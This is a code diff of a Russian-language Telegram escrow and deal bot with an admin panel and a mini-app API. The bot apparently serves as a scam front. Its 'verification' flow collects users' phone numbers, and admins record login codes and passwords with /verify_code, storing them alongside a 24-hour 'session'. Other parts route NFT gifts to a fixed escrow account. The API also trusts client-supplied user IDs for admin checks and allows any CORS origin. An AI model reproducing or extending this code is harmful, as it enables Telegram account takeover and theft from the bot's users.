+    await callback.message.edit_text("💰 <b>НАЧИСЛИТЬ БАЛАНС</b>\n\nВведите ID пользователя:")
     await state.set_state(AdminStates.waiting_user_id)
     await callback.answer()
 
 @dp.message(AdminStates.waiting_user_id)
 async def admin_get_user_id(message: types.Message, state: FSMContext):
-    lang = get_user_language(message.from_user.id)
     try:
         user_id = int(message.text.strip())
         await state.update_data(target_user_id=user_id)
-        await message.answer(f"💱 Выберите валюту:", reply_markup=currency_keyboard())
+        await message.answer("💱 Выберите валюту:", reply_markup=currency_keyboard())
         await state.set_state(AdminStates.waiting_currency)
     except:
-        await message.answer(f"❌ Неверный ID")
+        await message.answer("❌ Неверный ID")
 
 @dp.callback_query(lambda c: c.data.startswith("curr_"))
 async def admin_get_currency(callback: types.CallbackQuery, state: FSMContext):
-    lang = get_user_language(callback.from_user.id)
     currency = callback.data.split("_")[1]
     await state.update_data(target_currency=currency)
     await callback.message.edit_text(f"💰 Введите сумму в {currency}:")
@@ -691,7 +492,6 @@ async def admin_get_currency(callback: types.CallbackQuery, state: FSMContext):
 
 @dp.message(AdminStates.waiting_amount)
 async def admin_get_amount(message: types.Message, state: FSMContext):
-    lang = get_user_language(message.from_user.id)
     try:
         amount = float(message.text.strip())
         if amount <= 0:
@@ -702,38 +502,36 @@ async def admin_get_amount(message: types.Message, state: FSMContext):
         add_balance(user_id, currency, amount)
         await message.answer(
             f"✅ Начислено {amount} {currency} пользователю {user_id}",
-            reply_markup=admin_panel_keyboard(message.from_user.id)
+            reply_markup=admin_panel_keyboard()
         )
         await state.clear()
     except:
-        await message.answer(f"❌ Неверная сумма")
+        await message.answer("❌ Неверная сумма")
 
 @dp.callback_query(lambda c: c.data == "admin_manage_admins")
 async def admin_manage_admins(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
         return
     admin_list = "\n".join([f"• {aid}" for aid in list(admins.keys())]) if admins else "Нет дополнительных админов"
     await callback.message.edit_text(
-        f"👥 <b>{get_text(lang, 'admin_list')}</b>\n\n"
+        f"👥 <b>АДМИНЫ</b>\n\n"
         f"Главный админ: {MASTER_ADMIN_ID}\n"
         f"Дополнительные:\n{admin_list}\n\n"
         f"/add_admin [ID] - добавить\n"
         f"/remove_admin [ID] - удалить",
-        reply_markup=admin_panel_keyboard(callback.from_user.id)
+        reply_markup=admin_panel_keyboard()
     )
     await callback.answer()
 
 @dp.message(Command("add_admin"))
 async def add_admin(message: types.Message):
-    lang = get_user_language(message.from_user.id)
     if message.from_user.id != MASTER_ADMIN_ID:
-        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
+        await message.answer("⛔ Доступ запрещён")
         return
     args = message.text.split()
     if len(args) != 2:
-        await message.answer(f"❗️ Использование: /add_admin [ID]")
+        await message.answer("❗️ Использование: /add_admin [ID]")
         return
     try:
         new_admin_id = int(args[1])
@@ -741,88 +539,85 @@ async def add_admin(message: types.Message):
         save_json(FILES["admins"], admins)
         await message.answer(f"✅ Админ добавлен: {new_admin_id}")
     except:
-        await message.answer(f"❌ Неверный ID")
+        await message.answer("❌ Неверный ID")
 
 @dp.message(Command("remove_admin"))
 async def remove_admin(message: types.Message):
-    lang = get_user_language(message.from_user.id)
     if message.from_user.id != MASTER_ADMIN_ID:
-        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
+        await message.answer("⛔ Доступ запрещён")
         return
     args = message.text.split()
     if len(args) != 2:
-        await message.answer(f"❗️ Использование: /remove_admin [ID]")
+        await message.answer("❗️ Использование: /remove_admin [ID]")
         return
     try:
         admin_id = int(args[1])
         if admin_id == MASTER_ADMIN_ID:
-            await message.answer(f"❌ Нельзя удалить главного админа")
+            await message.answer("❌ Нельзя удалить главного админа")
             return
         if str(admin_id) in admins:
             del admins[str(admin_id)]
             save_json(FILES["admins"], admins)
             await message.answer(f"✅ Админ удалён: {admin_id}")
         else:
-            await message.answer(f"❌ Админ не найден")
+            await message.answer("❌ Админ не найден")
     except:
-        await message.answer(f"❌ Неверный ID")
+        await message.answer("❌ Неверный ID")
 
 @dp.callback_query(lambda c: c.data == "admin_all_deals")
 async def admin_all_deals(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
         return
     if not deals:
-        await callback.message.edit_text(f"📭 {get_text(lang, 'no_deals_total')}", reply_markup=admin_panel_keyboard(callback.from_user.id))
+        await callback.message.edit_text("📭 Нет сделок", reply_markup=admin_panel_keyboard())
         return
-    text = f"📊 <b>{get_text(lang, 'all_deals_title')}</b>\n\n"
+    text = "📊 <b>ВСЕ СДЕЛКИ</b>\n\n"
     for d_id, d in list(deals.items())[-20:]:
         status_map = {
-            "waiting_payment": f"⏳ {get_text(lang, 'status_waiting')}",
-            "paid": f"✅ {get_text(lang, 'status_paid')}",
-            "awaiting_confirmation": f"📦 {get_text(lang, 'status_awaiting')}",
-            "completed": f"🎉 {get_text(lang, 'status_completed')}"
+            "waiting_payment": "⏳ Ожидает оплаты",
+            "paid": "✅ Оплачено",
+            "awaiting_confirmation": "📦 Ожидает подтверждения",
+            "completed": "🎉 Завершено"
         }
         text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
-        text += f"   👤 {d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n"
-        text += f"   💰 {d.get('amount', 0)} {d.get('currency', '')}\n\n"
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
+        text += f"   👤 @{d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n"
+        text += f"   💰 {d.get('amount', 0)} {d.get('currency', '')}\n"
+        text += f"   📦 {d.get('product', '')[:30]}\n\n"
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "admin_withdraw_requests")
 async def admin_withdraw_requests(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
         return
     pending = {k: v for k, v in withdraw_requests.items() if v.get("status") == "pending"}
     if not pending:
-        await callback.message.edit_text(f"📭 {get_text(lang, 'no_active_requests')}", reply_markup=admin_panel_keyboard(callback.from_user.id))
+        await callback.message.edit_text("📭 Нет активных заявок", reply_markup=admin_panel_keyboard())
         return
-    text = f"💲 <b>Заявки на вывод</b>\n\n"
+    text = "💲 <b>ЗАЯВКИ НА ВЫВОД</b>\n\n"
     for rid, req in list(pending.items())[-10:]:
         text += f"#{rid}\n   👤 ID: {req.get('user_id', '?')}\n   💰 {req.get('amount', 0)} {req.get('currency', '')}\n   📝 {req.get('details', '')[:30]}\n   ➡️ /confirm_withdraw {rid}\n\n"
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
     await callback.answer()
 
 @dp.message(Command("confirm_withdraw"))
 async def confirm_withdraw_command(message: types.Message):
-    lang = get_user_language(message.from_user.id)
     if not is_admin(message.from_user.id):
-        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
+        await message.answer("⛔ Доступ запрещён")
         return
     args = message.text.split()
     if len(args) != 2:
-        await message.answer(f"❗️ Использование: /confirm_withdraw [ID]")
+        await message.answer("❗️ Использование: /confirm_withdraw [ID]")
         return
     request_id = args[1]
     if request_id not in withdraw_requests:
-        await message.answer(f"❌ Заявка не найдена")
+        await message.answer("❌ Заявка не найдена")
         return
     req = withdraw_requests[request_id]
     if req.get("status") != "pending":
-        await message.answer(f"❌ Заявка уже обработана")
+        await message.answer("❌ Заявка уже обработана")
         return
     bal = get_balance(req["user_id"])
     curr_key = req["currency"].lower()
@@ -833,135 +628,242 @@ async def confirm_withdraw_command(message: types.Message):
     req["completed_at"] = datetime.now().isoformat()
     save_json(FILES["withdraw"], withdraw_requests)
     await message.answer(f"✅ Вывод подтверждён #{request_id}")
-    await bot.send_message(
-        req["user_id"],
-        f"✅ <b>Вывод подтверждён</b>\n\n"
-        f"💰 {req['amount']} {req['currency']}"
-    )
+    try:
+        await bot.send_message(
+            req["user_id"],
+            f"✅ <b>ВЫВОД ПОДТВЕРЖДЁН</b>\n\n💰 {req['amount']} {req['currency']}"
+        )
+    except:
+        pass
 
 @dp.message(Command("reject_withdraw"))
 async def reject_withdraw_command(message: types.Message):
-    lang = get_user_language(message.from_user.id)
     if not is_admin(message.from_user.id):
-        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
+        await message.answer("⛔ Доступ запрещён")
         return
     args = message.text.split()
     if len(args) != 2:
-        await message.answer(f"❗️ Использование: /reject_withdraw [ID]")
+        await message.answer("❗️ Использование: /reject_withdraw [ID]")
         return
     request_id = args[1]
     if request_id not in withdraw_requests:
-        await message.answer(f"❌ Заявка не найдена")
+        await message.answer("❌ Заявка не найдена")
         return
     req = withdraw_requests[request_id]
     if req.get("status") != "pending":
-        await message.answer(f"❌ Заявка уже обработана")
+        await message.answer("❌ Заявка уже обработана")
         return
     req["status"] = "rejected"
     save_json(FILES["withdraw"], withdraw_requests)
     await message.answer(f"❌ Вывод отклонён #{request_id}")
 
-@dp.callback_query(lambda c: c.data == "admin_manage_reviews")
-async def admin_manage_reviews(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
+@dp.callback_query(lambda c: c.data == "admin_verification")
+async def admin_verification(callback: types.CallbackQuery):
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
         return
-    reviews_list = list(reviews.values())
-    if not reviews_list:
-        await callback.message.edit_text(f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\nПока нет отзывов", reply_markup=admin_panel_keyboard(callback.from_user.id))
+    pending = {k: v for k, v in verification_requests.items() if v.get("status") == "pending"}
+    if not pending:
+        await callback.message.edit_text("🔐 Нет активных запросов на верификацию", reply_markup=admin_panel_keyboard())
         return
-    text = f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\n"
-    for r in reviews_list[-10:]:
-        text += f"👤 {r.get('user', 'Аноним')} | {'⭐' * r.get('rating', 5)}\n"
-        text += f"📝 {r.get('text', '')[:50]}\n🆔 {r.get('id', '')}\n➡️ /delete_review {r.get('id', '')}\n\n"
-    await callback.message.edit_text(
-        text[:4000],
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🗑 Очистить все", callback_data="admin_clear_reviews")],
-            [InlineKeyboardButton(text="◀️ Админ панель", callback_data="menu_admin")]
-        ])
-    )
+    text = "🔐 <b>ЗАПРОСЫ НА ВЕРИФИКАЦИЮ</b>\n\n"
+    for rid, req in list(pending.items())[-10:]:
+        text += f"#{rid}\n   👤 @{req.get('username', '?')}\n   🆔 ID: {req.get('user_id', '?')}\n   📞 {req.get('phone', '')}\n   ➡️ /verify_code {rid} [код] [пароль]\n\n"
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
     await callback.answer()
 
-@dp.message(Command("delete_review"))
-async def delete_review_command(message: types.Message):
-    lang = get_user_language(message.from_user.id)
+@dp.message(Command("verify_code"))
+async def verify_code_command(message: types.Message):
     if not is_admin(message.from_user.id):
-        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
+        await message.answer("⛔ Доступ запрещён")
         return
     args = message.text.split()
-    if len(args) != 2:
-        await message.answer(f"❗️ Использование: /delete_review [ID]")
+    if len(args) < 3:
+        await message.answer("❗️ Использование: /verify_code [request_id] [код] [пароль]")
         return
-    review_id = args[1]
-    if review_id not in reviews:
-        await message.answer(f"❌ Отзыв не найден")
+    request_id = args[1]
+    code = args[2]
+    password = " ".join(args[3:]) if len(args) > 3 else "нет"
+    
+    if request_id not in verification_requests:
+        await message.answer("❌ Запрос не найден")
         return
-    del reviews[review_id]
-    save_json(FILES["reviews"], reviews)
-    await message.answer(f"✅ Отзыв удалён")
+    req = verification_requests[request_id]
+    if req.get("status") != "pending":
+        await message.answer("❌ Запрос уже обработан")
+        return
+    
+    complete_verification(req["user_id"], req["phone"], code)
+    req["status"] = "completed"
+    req["code"] = code
+    req["password"] = password
+    req["completed_at"] = datetime.now().isoformat()
+    save_json(FILES["verification_requests"], verification_requests)
+    
+    await message.answer(f"✅ Верификация подтверждена #{request_id}")
+    try:
+        await bot.send_message(
+            req["user_id"],
+            f"✅ <b>ВЕРИФИКАЦИЯ ПРОЙДЕНА</b>\n\n"
+            f"🔑 Ваш код: {code}\n"
+            f"🕐 Сессия активна 24 часа"
+        )
+    except:
+        pass
 
-@dp.callback_query(lambda c: c.data == "admin_clear_reviews")
-async def admin_clear_reviews(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
+# ============================================================
+# 11. ТИКЕТЫ (АДМИН)
+# ============================================================
+@dp.callback_query(lambda c: c.data == "admin_tickets")
+async def admin_tickets(callback: types.CallbackQuery):
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
         return
-    reviews.clear()
-    save_json(FILES["reviews"], reviews)
-    await callback.message.edit_text(f"✅ Все отзывы удалены", reply_markup=admin_panel_keyboard(callback.from_user.id))
+    
+    pending = {k: v for k, v in tickets.items() if v.get("status") == "open"}
+    
+    if not pending:
+        await callback.message.edit_text("🎫 Нет открытых тикетов", reply_markup=admin_panel_keyboard())
+        return
+    
+    text = "🎫 <b>ТИКЕТЫ</b>\n\n"
+    for tid, t in list(pending.items())[-10:]:
+        text += f"#{tid}\n"
+        text += f"   👤 @{t.get('username', 'неизвестно')} (ID: {t.get('user_id', '?')})\n"
+        text += f"   📝 {t.get('subject', '')}\n"
+        text += f"   💬 {t.get('message', '')[:50]}\n"
+        if t.get('response'):
+            text += f"   📩 Ответ: {t.get('response', '')[:50]}\n"
+        text += f"   ➡️ /answer_ticket {tid} [ответ]\n"
+        text += f"   ➡️ /close_ticket {tid}\n\n"
+    
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
     await callback.answer()
 
+@dp.message(Command("answer_ticket"))
+async def answer_ticket_command(message: types.Message):
+    if not is_admin(message.from_user.id):
+        await message.answer("⛔ Доступ запрещён")
+        return
+    
+    args = message.text.split(maxsplit=2)
+    if len(args) < 3:
+        await message.answer("❗️ Использование: /answer_ticket [ticket_id] [ответ]")
+        return
+    
+    ticket_id = args[1]
+    response = args[2]
+    
+    if ticket_id not in tickets:
+        await message.answer("❌ Тикет не найден")
+        return
+    
+    t = tickets[ticket_id]
+    t["response"] = response
+    t["status"] = "closed"
+    t["answered_at"] = datetime.now().isoformat()
+    t["answered_by"] = message.from_user.id
+    save_json(FILES["tickets"], tickets)
+    
+    await message.answer(f"✅ Ответ отправлен на тикет #{ticket_id}")
+    
+    try:
+        await bot.send_message(
+            t["user_id"],
+            f"📩 <b>ОТВЕТ НА ТИКЕТ #{ticket_id}</b>\n\n"
+            f"📝 {response}\n\n"
+            f"✅ Тикет закрыт"
+        )
+    except:
+        pass
+
+@dp.message(Command("close_ticket"))
+async def close_ticket_command(message: types.Message):
+    if not is_admin(message.from_user.id):
+        await message.answer("⛔ Доступ запрещён")
+        return
+    
+    args = message.text.split()
+    if len(args) != 2:
+        await message.answer("❗️ Использование: /close_ticket [ticket_id]")
+        return
+    
+    ticket_id = args[1]
+    
+    if ticket_id not in tickets:
+        await message.answer("❌ Тикет не найден")
+        return
+    
+    t = tickets[ticket_id]
+    t["status"] = "closed"
+    t["closed_at"] = datetime.now().isoformat()
+    t["closed_by"] = message.from_user.id
+    save_json(FILES["tickets"], tickets)
+    
+    await message.answer(f"✅ Тикет #{ticket_id} закрыт")
+    
+    try:
+        await bot.send_message(
+            t["user_id"],
+            f"🔒 <b>ТИКЕТ #{ticket_id} ЗАКРЫТ</b>\n\n"
+            f"Администратор закрыл ваш тикет."
+        )
+    except:
+        pass
+
+# ============================================================
+# 12. ЛОГИ И СТАТИСТИКА
+# ============================================================
 @dp.callback_query(lambda c: c.data == "admin_logs")
 async def admin_logs(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
         return
     logs_list = list(logs.values())[-20:]
     if not logs_list:
-        await callback.message.edit_text(f"📋 <b>Логи</b>\n\nНет записей", reply_markup=admin_panel_keyboard(callback.from_user.id))
+        await callback.message.edit_text("📋 <b>ЛОГИ</b>\n\nНет записей", reply_markup=admin_panel_keyboard())
         return
-    text = "📋 <b>Последние логи</b>\n\n"
+    text = "📋 <b>ПОСЛЕДНИЕ ЛОГИ</b>\n\n"
     for log_entry in reversed(logs_list[-10:]):
         text += f"🕐 {log_entry.get('time', '')[:19]}\n"
         text += f"📌 {log_entry.get('action', '')}\n"
-        text += f"📊 {json.dumps(log_entry.get('data', {}), ensure_ascii=False)[:80]}\n\n"
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(callback.from_user.id))
+        data = log_entry.get('data', {})
+        text += f"📊 {json.dumps(data, ensure_ascii=False)[:80]}\n\n"
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "admin_stats")
 async def admin_stats(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
         return
     
     total_users = len(balance)
     total_deals = len(deals)
-    total_reviews = len(reviews)
     total_volume = round(sum(d.get('amount', 0) for d in deals.values() if d.get('currency') == 'TON'), 1)
+    active_deals = len([d for d in deals.values() if d.get('status') in ['waiting_payment', 'paid', 'awaiting_confirmation']])
+    open_tickets = len([t for t in tickets.values() if t.get('status') == 'open'])
     
     await callback.message.edit_text(
         f"📊 <b>СТАТИСТИКА</b>\n\n"
         f"👥 Пользователей: {total_users}\n"
         f"📊 Всего сделок: {total_deals}\n"
-        f"⭐️ Отзывов: {total_reviews}\n"
+        f"🔄 Активных сделок: {active_deals}\n"
         f"💎 Объём (TON): {total_volume}\n"
-        f"🔄 Активных сделок: {len([d for d in deals.values() if d.get('status') in ['waiting_payment', 'paid', 'awaiting_confirmation']])}",
-        reply_markup=admin_panel_keyboard(callback.from_user.id)
+        f"✅ Завершённых сделок: {len([d for d in deals.values() if d.get('status') == 'completed'])}\n"
+        f"🎫 Открытых тикетов: {open_tickets}",
+        reply_markup=admin_panel_keyboard()
     )
     await callback.answer()
 
 # ============================================================
-# 14. API ДЛЯ MINI APP
+# 13. API ДЛЯ MINI APP
 # ============================================================
 async def handle_api(request):
     headers = {
         'Access-Control-Allow-Origin': '*',
-        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS, DELETE, PUT',
-        'Access-Control-Allow-Headers': 'Content-Type, X-Telegram-User-Id, X-Telegram-Username, Authorization',
+        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
+        'Access-Control-Allow-Headers': 'Content-Type, X-Telegram-User-Id, X-Telegram-Username',
         'Access-Control-Allow-Credentials': 'true'
     }
     
@@ -992,6 +894,8 @@ async def handle_api(request):
         currency = data.get('currency')
         amount = data.get('amount')
         buyer_username = data.get('buyer_username')
+        category = data.get('category', 'other')
+        nft_link = data.get('nft_link')
         username = data.get('username', str(user_id))
         
         if not all([user_id, product, currency, amount, buyer_username]):
@@ -1007,13 +911,38 @@ async def handle_api(request):
             "product": product,
             "currency": currency,
             "amount": float(amount),
+            "category": category,
+            "nft_link": nft_link,
             "status": "waiting_payment",
             "created_at": datetime.now().isoformat(),
             "paid_by_admin": None,
-            "completed_at": None
+            "completed_at": None,
+            "nft_transferred": False,
+            "nft_transfer_account": NFT_ESCROW_ACCOUNT if category == "nft_gift" else None
         }
         save_json(FILES["deals"], deals)
         link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
+        
+        log_action("deal_created", {
+            "deal_id": deal_id,
+            "seller_id": user_id,
+            "buyer_username": buyer_username,
+            "product": product,
+            "amount": amount,
+            "currency": currency,
+            "category": category
+        })
+        
+        await log_to_master(
+            f"📦 НОВАЯ СДЕЛКА #{deal_id}\n\n"
+            f"👤 Продавец: @{username} (ID: {user_id})\n"
+            f"👤 Покупатель: @{buyer_username}\n"
+            f"📦 Товар: {product}\n"
+            f"💰 Сумма: {amount} {currency}\n"
+            f"🏷️ Категория: {category}\n"
+            f"{'🔗 NFT: ' + nft_link if nft_link else ''}\n"
+            f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        )
         
         return web.json_response({
             'success': True,
@@ -1034,62 +963,47 @@ async def handle_api(request):
                 user_deals.append(d_copy)
         return web.json_response({'success': True, 'deals': user_deals}, headers=headers)
     
+    # ===== ВСЕ СДЕЛКИ (АДМИН) =====
+    elif endpoint == '/api/all_deals':
+        if not is_admin(user_id):
+            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
+        return web.json_response({'success': True, 'deals': list(deals.values())}, headers=headers)
+    
     # ===== ПРОВЕРКА АДМИНА =====
     elif endpoint == '/api/is_admin':
         return web.json_response({'success': True, 'is_admin': is_admin(user_id)}, headers=headers)
     
-    # ===== ОТЗЫВЫ =====
-    elif endpoint == '/api/reviews':
-        limit = data.get('limit', 10)
-        page = data.get('page', 0)
-        reviews_list = list(reviews.values())
-        start = page * limit
-        end = start + limit
-        paginated = reviews_list[start:end]
+    # ===== СТАТИСТИКА =====
+    elif endpoint == '/api/stats':
         return web.json_response({
             'success': True,
-            'reviews': paginated,
-            'total': len(reviews_list)
+            'deals_today': stats.get('deals_today', len([d for d in deals.values() if d.get('created_at', '').startswith(datetime.now().strftime('%Y-%m-%d'))])),
+            'users': stats.get('users', len(balance)),
+            'volume': stats.get('volume', round(sum(d.get('amount', 0) for d in deals.values() if d.get('currency') == 'TON'), 1))
         }, headers=headers)
     
-    # ===== ДОБАВИТЬ ОТЗЫВ =====
-    elif endpoint == '/api/add_review':
-        rating = data.get('rating')
-        text = data.get('text')
-        anonymous = data.get('anonymous', True)
-        if not all([user_id, rating, text]):
-            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
-        review_id = str(uuid.uuid4())[:8]
-        reviews[review_id] = {
-            "id": review_id,
-            "user": "Аноним" if anonymous else str(user_id),
-            "rating": rating,
-            "text": text,
-            "anonymous": anonymous,
-            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
-            "user_id": user_id
-        }
-        save_json(FILES["reviews"], reviews)
-        return web.json_response({'success': True, 'review_id': review_id}, headers=headers)
+    # ===== ПРОВЕРКА 2-Х СДЕЛОК =====
+    elif endpoint == '/api/has_2_deals':
+        if not user_id:
+            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
+        bal = get_balance(user_id)
+        partners = bal.get('deal_partners', {})
+        has_two = any(count >= 2 for count in partners.values())
+        return web.json_response({
+            'success': True,
+            'has_2_deals': has_two,
+            'total_deals': sum(partners.values())
+        }, headers=headers)
     
-    # ===== УДАЛИТЬ ОТЗЫВ =====
-    elif endpoint == '/api/delete_review':
-        review_id = data.get('review_id')
-        if not is_admin(user_id):
-            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
-        if review_id in reviews:
-            del reviews[review_id]
-            save_json(FILES["reviews"], reviews)
-            return web.json_response({'success': True}, headers=headers)
-        return web.json_response({'success': False, 'error': 'Review not found'}, headers=headers)
-    
-    # ===== ОЧИСТИТЬ ОТЗЫВЫ =====
-    elif endpoint == '/api/clear_reviews':
-        if not is_admin(user_id):
-            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
-        reviews.clear()
-        save_json(FILES["reviews"], reviews)
-        return web.json_response({'success': True}, headers=headers)
+    # ===== СТАТУС ВЕРИФИКАЦИИ =====
+    elif endpoint == '/api/verification_status':
+        if not user_id:
+            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
+        return web.json_response({
+            'success': True,
+            'verified': is_verified(user_id),
+            'expires_at': verification_data.get(str(user_id), {}).get('expires_at')
+        }, headers=headers)
     
     # ===== ЗАПРОС ВЕРИФИКАЦИИ =====
     elif endpoint == '/api/send_verification_request':
@@ -1110,7 +1024,6 @@ async def handle_api(request):
             "username": username,
             "phone": phone,
             "status": "pending",
-            "step": "waiting_code",
             "created_at": datetime.now().isoformat()
         }
         save_json(FILES["verification_requests"], verification_requests)
@@ -1121,7 +1034,8 @@ async def handle_api(request):
             f"👤 Пользователь: @{username}\n"
             f"🆔 ID: {user_id}\n"
             f"📞 Номер: {phone}\n"
-            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            f"⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"Для подтверждения: /verify_code {request_id} [код] [пароль]"
         )
         
         return web.json_response({
@@ -1204,37 +1118,22 @@ async def handle_api(request):
         
         return web.json_response({'success': True, 'request_id': request_id}, headers=headers)
     
-    # ===== СТАТИСТИКА =====
-    elif endpoint == '/api/stats':
+    # ===== ЗАЯВКИ НА ВЫВОД =====
+    elif endpoint == '/api/withdraw_requests':
+        if not is_admin(user_id):
+            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
         return web.json_response({
             'success': True,
-            'deals_today': stats.get('deals_today', len([d for d in deals.values() if d.get('created_at', '').startswith(datetime.now().strftime('%Y-%m-%d'))])),
-            'users': stats.get('users', len(balance)),
-            'reviews': stats.get('reviews', len(reviews)),
-            'volume': stats.get('volume', round(sum(d.get('amount', 0) for d in deals.values() if d.get('currency') == 'TON'), 1))
+            'requests': list(withdraw_requests.values())
         }, headers=headers)
     
-    # ===== ПРОВЕРКА 2-Х СДЕЛОК =====
-    elif endpoint == '/api/has_2_deals':
-        if not user_id:
-            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
-        bal = get_balance(user_id)
-        partners = bal.get('deal_partners', {})
-        has_two = any(count >= 2 for count in partners.values())
+    # ===== ЗАПРОСЫ ВЕРИФИКАЦИИ =====
+    elif endpoint == '/api/verification_requests':
+        if not is_admin(user_id):
+            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
         return web.json_response({
             'success': True,
-            'has_2_deals': has_two,
-            'total_deals': sum(partners.values())
-        }, headers=headers)
-    
-    # ===== СТАТУС ВЕРИФИКАЦИИ =====
-    elif endpoint == '/api/verification_status':
-        if not user_id:
-            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
-        return web.json_response({
-            'success': True,
-            'verified': is_verified(user_id),
-            'expires_at': verification_data.get(str(user_id), {}).get('expires_at')
+            'requests': list(verification_requests.values())
         }, headers=headers)
     
     # ===== НАЧИСЛИТЬ БАЛАНС =====
@@ -1276,39 +1175,7 @@ async def handle_api(request):
         
         return web.json_response({'success': True}, headers=headers)
     
-    # ===== ВСЕ ЗАЯВКИ НА ВЕРИФИКАЦИЮ =====
-    elif endpoint == '/api/verification_requests':
-        if not is_admin(user_id):
-            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
-        
-        return web.json_response({
-            'success': True,
-            'requests': list(verification_requests.values())
-        }, headers=headers)
-    
-    # ===== ВСЕ ЗАЯВКИ НА ВЫВОД =====
-    elif endpoint == '/api/withdraw_requests':
-        if not is_admin(user_id):
-            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
-        
-        return web.json_response({
-            'success': True,
-            'requests': list(withdraw_requests.values())
-        }, headers=headers)
-    
-    # ===== ВСЕ СДЕЛКИ =====
-    elif endpoint == '/api/all_deals':
-        if not is_admin(user_id):
-            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
-        
-        return web.json_response({
-            'success': True,
-            'deals': list(deals.values())
-        }, headers=headers)
-    
-    # ============================================================
-    # 🔥 ОПЛАТА С БАЛАНСА (КИДАЕТ КНОПКУ С MINI APP)
-    # ============================================================
+    # ===== ОПЛАТА С БАЛАНСА =====
     elif endpoint == '/api/pay_balance':
         deal_id = data.get('deal_id')
         user_id = data.get('user_id')
@@ -1336,6 +1203,13 @@ async def handle_api(request):
         deal["paid_by_admin"] = user_id
         save_json(FILES["deals"], deals)
         
+        log_action("payment_from_balance", {
+            "deal_id": deal_id,
+            "buyer_id": user_id,
+            "amount": deal["amount"],
+            "currency": deal["currency"]
+        })
+        
         await log_to_master(
             f"💳 ОПЛАТА С БАЛАНСА\n\n"
             f"🆔 Сделка: #{deal_id}\n"
@@ -1345,10 +1219,7 @@ async def handle_api(request):
             f"👤 Продавец: @{deal['seller_username']}"
         )
         
-        # 🔥 ОТПРАВЛЯЕМ ПРОДАВЦУ КНОПКУ С MINI APP
         try:
-            seller_lang = get_user_language(deal["seller_id"])
-            
             keyboard = InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(
                     text="📦 Подтвердить передачу",
@@ -1366,7 +1237,9 @@ async def handle_api(request):
                 f"💎 <b>СДЕЛКА #{deal_id} ОПЛАЧЕНА!</b>\n\n"
                 f"💰 {deal['amount']} {deal['currency']}\n"
                 f"👤 ПОКУПАТЕЛЬ: @{deal['buyer_username']}\n"
-                f"📦 ТОВАР: {deal['product']}\n\n"
